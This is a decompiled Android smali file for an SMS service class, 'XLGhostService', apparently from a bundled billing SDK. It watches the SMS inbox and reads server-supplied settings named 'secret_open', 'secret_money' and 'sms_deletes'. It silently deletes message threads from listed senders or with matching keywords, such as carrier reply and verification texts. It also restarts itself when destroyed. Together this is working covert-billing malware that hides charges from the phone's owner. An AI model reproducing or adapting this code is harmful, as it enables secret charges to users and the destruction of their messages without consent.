.class public Lcom/xingluo/platform/single/sms/service/XLGhostService;
.super Landroid/app/Service;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/xingluo/platform/single/sms/service/XLGhostService$a;,
        Lcom/xingluo/platform/single/sms/service/XLGhostService$b;
    }
.end annotation


# instance fields
.field private SMS_INBOX:Landroid/net/Uri;

.field gost:Lcom/xingluo/platform/single/net/a/c;

.field private mLogger:Lcom/xingluo/platform/single/util/i;

.field replyList:Ljava/util/HashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashMap",
            "<",
            "Ljava/lang/String;",
            "Lcom/xingluo/platform/single/sms/service/XLGhostService$a;",
            ">;"
        }
    .end annotation
.end field

.field private smsObserver:Lcom/xingluo/platform/single/sms/service/XLGhostService$b;


# direct methods
.method public constructor <init>()V
    .locals 2

    const/4 v1, 0x0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const-class v0, Lcom/xingluo/platform/single/sms/service/XLGhostService;

    invoke-virtual {v0}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/xingluo/platform/single/util/i;->a(Ljava/lang/String;)Lcom/xingluo/platform/single/util/i;

    move-result-object v0

    iput-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->mLogger:Lcom/xingluo/platform/single/util/i;

    iput-object v1, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->smsObserver:Lcom/xingluo/platform/single/sms/service/XLGhostService$b;

    const-string v0, "content://sms/"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    iput-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->SMS_INBOX:Landroid/net/Uri;

    iput-object v1, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->gost:Lcom/xingluo/platform/single/net/a/c;

    iput-object v1, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->replyList:Ljava/util/HashMap;

    return-void
.end method

.method static synthetic access$0(Lcom/xingluo/platform/single/sms/service/XLGhostService;)Lcom/xingluo/platform/single/util/i;
    .locals 1

    iget-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->mLogger:Lcom/xingluo/platform/single/util/i;

    return-object v0
.end method

.method static synthetic access$1(Lcom/xingluo/platform/single/sms/service/XLGhostService;Ljava/lang/String;)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/xingluo/platform/single/sms/service/XLGhostService;->getReplys(Ljava/lang/String;)V

    return-void
.end method

.method static synthetic access$2(Lcom/xingluo/platform/single/sms/service/XLGhostService;Lorg/json/JSONObject;)Lcom/xingluo/platform/single/net/a/c;
    .locals 1

    invoke-direct {p0, p1}, Lcom/xingluo/platform/single/sms/service/XLGhostService;->parseGost(Lorg/json/JSONObject;)Lcom/xingluo/platform/single/net/a/c;

    move-result-object v0

    return-object v0
.end method

.method private getReplys(Ljava/lang/String;)V
    .locals 10

    const/4 v1, 0x1

    const/4 v2, 0x0

    iget-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->mLogger:Lcom/xingluo/platform/single/util/i;

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "replyInfo start ="

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Lcom/xingluo/platform/single/util/i;->d(Ljava/lang/String;)V

    if-eqz p1, :cond_0

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_0

    invoke-static {}, Lcom/xingluo/platform/single/platform/XLSinglePlatform;->getInstance()Lcom/xingluo/platform/single/platform/XLSinglePlatform;

    move-result-object v0

    invoke-virtual {v0, p1}, Lcom/xingluo/platform/single/platform/XLSinglePlatform;->saveReply(Ljava/lang/String;)V

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    iput-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->replyList:Ljava/util/HashMap;

    const-string v0, ";"

    invoke-virtual {p1, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v4

    array-length v5, v4

    move v3, v2

    :goto_0
    if-lt v3, v5, :cond_1

    :cond_0
    return-void

    :cond_1
    aget-object v0, v4, v3

    const-string v6, ","

    invoke-virtual {v0, v6}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v6

    const/4 v0, 0x2

    aget-object v0, v6, v0

    const-string v7, "1"

    invoke-virtual {v0, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    move v0, v1

    :goto_1
    new-instance v7, Lcom/xingluo/platform/single/sms/service/XLGhostService$a;

    invoke-direct {v7, p0}, Lcom/xingluo/platform/single/sms/service/XLGhostService$a;-><init>(Lcom/xingluo/platform/single/sms/service/XLGhostService;)V

    aget-object v8, v6, v1

    const-string v9, "#"

    invoke-virtual {v8, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v8

    iput-object v8, v7, Lcom/xingluo/platform/single/sms/service/XLGhostService$a;->a:[Ljava/lang/String;

    iput-boolean v0, v7, Lcom/xingluo/platform/single/sms/service/XLGhostService$a;->b:Z

    iget-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->replyList:Ljava/util/HashMap;

    aget-object v6, v6, v2

    invoke-virtual {v0, v6, v7}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    add-int/lit8 v0, v3, 0x1

    move v3, v0

    goto :goto_0

    :cond_2
    move v0, v2

    goto :goto_1
.end method

.method private parseGost(Lorg/json/JSONObject;)Lcom/xingluo/platform/single/net/a/c;
    .locals 14

    const/4 v13, 0x2

    const/4 v12, 0x1

    const/4 v1, 0x0

    new-instance v3, Lcom/xingluo/platform/single/net/a/c;

    invoke-direct {v3}, Lcom/xingluo/platform/single/net/a/c;-><init>()V

    invoke-virtual {p1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Lcom/xingluo/platform/single/net/a/c;->a(Ljava/lang/String;)V

    const-string v0, "secret_open"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v0

    const/4 v2, -0x1

    if-eq v0, v2, :cond_3

    invoke-virtual {v3, v12}, Lcom/xingluo/platform/single/net/a/c;->a(Z)V

    const-string v0, "secret_money"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Lcom/xingluo/platform/single/net/a/c;->b(Ljava/lang/String;)V

    new-instance v4, Ljava/util/HashMap;

    invoke-direct {v4}, Ljava/util/HashMap;-><init>()V

    const-string v0, "sms_deletes"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v2, ";"

    invoke-virtual {v0, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    array-length v6, v5

    move v0, v1

    :goto_0
    if-lt v0, v6, :cond_0

    invoke-virtual {v3, v4}, Lcom/xingluo/platform/single/net/a/c;->a(Ljava/util/HashMap;)V

    :goto_1
    new-instance v2, Ljava/util/HashMap;

    invoke-direct {v2}, Ljava/util/HashMap;-><init>()V

    :try_start_0
    const-string v0, "sms_verifys"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v4, ";"

    invoke-virtual {v0, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v4

    array-length v5, v4
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move v0, v1

    :goto_2
    if-lt v0, v5, :cond_4

    :goto_3
    invoke-virtual {v3, v2}, Lcom/xingluo/platform/single/net/a/c;->b(Ljava/util/HashMap;)V

    const-string v0, "sms_delete_open"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v0

    if-ne v0, v12, :cond_5

    invoke-virtual {v3, v12}, Lcom/xingluo/platform/single/net/a/c;->b(Z)V

    :goto_4
    return-object v3

    :cond_0
    aget-object v2, v5, v0

    new-instance v7, Ljava/util/ArrayList;

    invoke-direct {v7}, Ljava/util/ArrayList;-><init>()V

    const-string v8, ","

    invoke-virtual {v2, v8}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v8

    array-length v2, v8

    if-ne v2, v13, :cond_1

    aget-object v2, v8, v12

    const-string v9, "#"

    invoke-virtual {v2, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v9

    array-length v10, v9

    move v2, v1

    :goto_5
    if-lt v2, v10, :cond_2

    :cond_1
    aget-object v2, v8, v1

    invoke-virtual {v4, v2, v7}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_2
    aget-object v11, v9, v2

    invoke-virtual {v7, v11}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    add-int/lit8 v2, v2, 0x1

    goto :goto_5

    :cond_3
    invoke-virtual {v3, v1}, Lcom/xingluo/platform/single/net/a/c;->a(Z)V

    goto :goto_1

    :cond_4
    :try_start_1
    aget-object v6, v4, v0

    new-instance v7, Lcom/xingluo/platform/single/net/a/b;

    invoke-direct {v7}, Lcom/xingluo/platform/single/net/a/b;-><init>()V

    const-string v8, ","

    invoke-virtual {v6, v8}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v6

    const/4 v8, 0x0

    aget-object v8, v6, v8

    invoke-virtual {v7, v8}, Lcom/xingluo/platform/single/net/a/b;->a(Ljava/lang/String;)V

    const/4 v8, 0x1

    aget-object v8, v6, v8

    invoke-virtual {v7, v8}, Lcom/xingluo/platform/single/net/a/b;->b(Ljava/lang/String;)V

    const/4 v8, 0x2

    aget-object v8, v6, v8

    invoke-virtual {v7, v8}, Lcom/xingluo/platform/single/net/a/b;->c(Ljava/lang/String;)V

    const/4 v8, 0x3

    aget-object v6, v6, v8

    invoke-static {v6}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v6

    invoke-virtual {v7, v6}, Lcom/xingluo/platform/single/net/a/b;->a(I)V

    invoke-virtual {v7}, Lcom/xingluo/platform/single/net/a/b;->a()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v2, v6, v7}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    add-int/lit8 v0, v0, 0x1

    goto :goto_2

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_3

    :cond_5
    invoke-virtual {v3, v1}, Lcom/xingluo/platform/single/net/a/c;->b(Z)V

    goto :goto_4
.end method


# virtual methods
.method public deleteReplySMS()V
    .locals 14

    iget-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->mLogger:Lcom/xingluo/platform/single/util/i;

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "service\u8c03\u7528\u5220\u9664reply\u77ed\u4fe1:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->replyList:Ljava/util/HashMap;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/xingluo/platform/single/util/i;->d(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->replyList:Ljava/util/HashMap;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->replyList:Ljava/util/HashMap;

    invoke-virtual {v0}, Ljava/util/HashMap;->size()I

    move-result v0

    if-nez v0, :cond_2

    :cond_0
    iget-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->mLogger:Lcom/xingluo/platform/single/util/i;

    const-string v1, "replyList is null"

    invoke-virtual {v0, v1}, Lcom/xingluo/platform/single/util/i;->f(Ljava/lang/String;)V

    :cond_1
    :goto_0
    return-void

    :cond_2
    const-string v7, "content://sms/"

    iget-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->replyList:Ljava/util/HashMap;

    invoke-virtual {v0}, Ljava/util/HashMap;->keySet()Ljava/util/Set;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v8

    :goto_1
    invoke-interface {v8}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-interface {v8}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    move-object v6, v0

    check-cast v6, Ljava/lang/String;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, " address LIKE \'%"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "%\'"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v7}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {p0}, Lcom/xingluo/platform/single/sms/service/XLGhostService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/String;

    const/4 v4, 0x0

    const-string v5, "thread_id"

    aput-object v5, v2, v4

    const/4 v4, 0x1

    const-string v5, "address"

    aput-object v5, v2, v4

    const/4 v4, 0x2

    const-string v5, "body"

    aput-object v5, v2, v4

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v2

    if-eqz v2, :cond_9

    :cond_3
    invoke-interface {v2}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_4

    :goto_2
    invoke-interface {v2}, Landroid/database/Cursor;->close()V

    goto :goto_1

    :cond_4
    const-string v0, "thread_id"

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    const-string v0, "body"

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iget-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->replyList:Ljava/util/HashMap;

    invoke-virtual {v0, v6}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/xingluo/platform/single/sms/service/XLGhostService$a;

    iget-object v5, v0, Lcom/xingluo/platform/single/sms/service/XLGhostService$a;->a:[Ljava/lang/String;

    array-length v9, v5

    const/4 v0, 0x0

    move v1, v0

    :goto_3
    if-ge v1, v9, :cond_3

    aget-object v0, v5, v1

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_6

    iget-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->replyList:Ljava/util/HashMap;

    invoke-virtual {v0, v6}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/xingluo/platform/single/sms/service/XLGhostService$a;

    iget-boolean v0, v0, Lcom/xingluo/platform/single/sms/service/XLGhostService$a;->b:Z

    if-eqz v0, :cond_7

    iget-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->gost:Lcom/xingluo/platform/single/net/a/c;

    invoke-virtual {v0}, Lcom/xingluo/platform/single/net/a/c;->f()Z

    move-result v0

    if-nez v0, :cond_5

    invoke-virtual {p0}, Lcom/xingluo/platform/single/sms/service/XLGhostService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v10, "content://sms/"

    invoke-static {v10}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v10

    const-string v11, "thread_id=?"

    const/4 v12, 0x1

    new-array v12, v12, [Ljava/lang/String;

    const/4 v13, 0x0

    aput-object v3, v12, v13

    invoke-virtual {v0, v10, v11, v12}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    :cond_5
    iget-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->mLogger:Lcom/xingluo/platform/single/util/i;

    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "service\u5220\u9664reply\u77ed\u4fe1\u5185\u5bb9:"

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v10, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v0, v10}, Lcom/xingluo/platform/single/util/i;->d(Ljava/lang/String;)V

    :cond_6
    add-int/lit8 v0, v1, 0x1

    move v1, v0

    goto :goto_3

    :cond_7
    iget-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->gost:Lcom/xingluo/platform/single/net/a/c;

    invoke-virtual {v0}, Lcom/xingluo/platform/single/net/a/c;->b()Z

    move-result v0

    if-nez v0, :cond_8

    iget-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->gost:Lcom/xingluo/platform/single/net/a/c;

    invoke-virtual {v0}, Lcom/xingluo/platform/single/net/a/c;->c()Z

    move-result v0

    if-eqz v0, :cond_5

    :cond_8
    iget-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->gost:Lcom/xingluo/platform/single/net/a/c;

    invoke-virtual {v0}, Lcom/xingluo/platform/single/net/a/c;->f()Z

    move-result v0

    if-nez v0, :cond_5

    invoke-virtual {p0}, Lcom/xingluo/platform/single/sms/service/XLGhostService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "content://sms/"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const-string v2, "thread_id=?"

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/String;

    const/4 v5, 0x0

    aput-object v3, v4, v5

    invoke-virtual {v0, v1, v2, v4}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    goto/16 :goto_0

    :cond_9
    iget-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->mLogger:Lcom/xingluo/platform/single/util/i;

    const-string v1, "service\u7a7a_\u65e0\u77ed\u4fe1"

    invoke-virtual {v0, v1}, Lcom/xingluo/platform/single/util/i;->d(Ljava/lang/String;)V

    goto/16 :goto_2
.end method

.method public deleteSMS()V
    .locals 14

    const/4 v4, 0x0

    const/4 v13, 0x1

    const/4 v12, 0x0

    iget-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->mLogger:Lcom/xingluo/platform/single/util/i;

    const-string v1, "service\u8c03\u7528\u5220\u9664\u77ed\u4fe1"

    invoke-virtual {v0, v1}, Lcom/xingluo/platform/single/util/i;->d(Ljava/lang/String;)V

    const-string v7, "content://sms/"

    iget-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->gost:Lcom/xingluo/platform/single/net/a/c;

    invoke-virtual {v0}, Lcom/xingluo/platform/single/net/a/c;->h()Ljava/util/HashMap;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/HashMap;->keySet()Ljava/util/Set;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v8

    :cond_0
    :goto_0
    invoke-interface {v8}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-nez v0, :cond_1

    return-void

    :cond_1
    invoke-interface {v8}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    move-object v6, v0

    check-cast v6, Ljava/lang/String;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, " address = \'"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "\' "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v7}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {p0}, Lcom/xingluo/platform/single/sms/service/XLGhostService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/String;

    const-string v5, "thread_id"

    aput-object v5, v2, v12

    const-string v5, "address"

    aput-object v5, v2, v13

    const/4 v5, 0x2

    const-string v9, "body"

    aput-object v9, v2, v5

    move-object v5, v4

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    if-eqz v1, :cond_5

    :cond_2
    :goto_1
    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "thread_id"

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    const-string v0, "body"

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    iget-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->gost:Lcom/xingluo/platform/single/net/a/c;

    invoke-virtual {v0}, Lcom/xingluo/platform/single/net/a/c;->h()Ljava/util/HashMap;

    move-result-object v0

    invoke-virtual {v0, v6}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_3

    invoke-virtual {p0}, Lcom/xingluo/platform/single/sms/service/XLGhostService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v3, "content://sms/"

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    const-string v5, "thread_id=?"

    new-array v9, v13, [Ljava/lang/String;

    aput-object v2, v9, v12

    invoke-virtual {v0, v3, v5, v9}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    goto :goto_1

    :cond_3
    iget-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->gost:Lcom/xingluo/platform/single/net/a/c;

    invoke-virtual {v0}, Lcom/xingluo/platform/single/net/a/c;->h()Ljava/util/HashMap;

    move-result-object v0

    invoke-virtual {v0, v6}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v5

    :cond_4
    :goto_2
    invoke-interface {v5}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_2

    invoke-interface {v5}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_4

    invoke-virtual {p0}, Lcom/xingluo/platform/single/sms/service/XLGhostService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v9, "content://sms/"

    invoke-static {v9}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v9

    const-string v10, "thread_id=?"

    new-array v11, v13, [Ljava/lang/String;

    aput-object v2, v11, v12

    invoke-virtual {v0, v9, v10, v11}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    goto :goto_2

    :cond_5
    iget-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->mLogger:Lcom/xingluo/platform/single/util/i;

    const-string v1, "service\u7a7a_\u65e0\u77ed\u4fe1"

    invoke-virtual {v0, v1}, Lcom/xingluo/platform/single/util/i;->d(Ljava/lang/String;)V

    goto/16 :goto_0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 0

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    return-void
.end method

.method public onDestroy()V
    .locals 2

    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    const-class v1, Lcom/xingluo/platform/single/sms/service/XLGhostService;

    invoke-virtual {v0, p0, v1}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcom/xingluo/platform/single/sms/service/XLGhostService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 4

    const/4 v3, 0x1

    new-instance v0, Lcom/xingluo/platform/single/sms/service/XLGhostService$b;

    const/4 v1, 0x0

    invoke-direct {v0, p0, p0, v1}, Lcom/xingluo/platform/single/sms/service/XLGhostService$b;-><init>(Lcom/xingluo/platform/single/sms/service/XLGhostService;Landroid/content/Context;Landroid/os/Handler;)V

    iput-object v0, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->smsObserver:Lcom/xingluo/platform/single/sms/service/XLGhostService$b;

    invoke-virtual {p0}, Lcom/xingluo/platform/single/sms/service/XLGhostService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    iget-object v1, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->SMS_INBOX:Landroid/net/Uri;

    iget-object v2, p0, Lcom/xingluo/platform/single/sms/service/XLGhostService;->smsObserver:Lcom/xingluo/platform/single/sms/service/XLGhostService$b;

    invoke-virtual {v0, v1, v3, v2}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    return v3
.end method
